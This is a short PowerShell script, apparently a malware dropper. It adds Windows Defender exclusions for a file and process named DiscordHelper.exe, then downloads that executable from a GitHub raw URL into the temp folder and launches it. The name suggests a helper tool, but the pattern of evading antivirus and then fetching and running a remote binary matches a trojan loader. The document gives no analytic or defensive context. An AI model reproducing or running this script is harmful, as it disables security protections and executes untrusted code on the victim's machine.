Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\DiscordHelper.exe"
Add-MpPreference -ExclusionPath $env:TEMP\DiscordHelper.exe
Add-MpPreference -ExclusionProcess "DiscordHelper.exe"
$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/DiscordHelper.exe"

 $output = "$env:TEMP\DiscordHelper.exe"

Invoke-WebRequest -Uri $url -OutFile $output

if (Test-Path $output) {
    Start-Process -FilePath $output
} else {
    Write-Host "Failed to download the file."
}
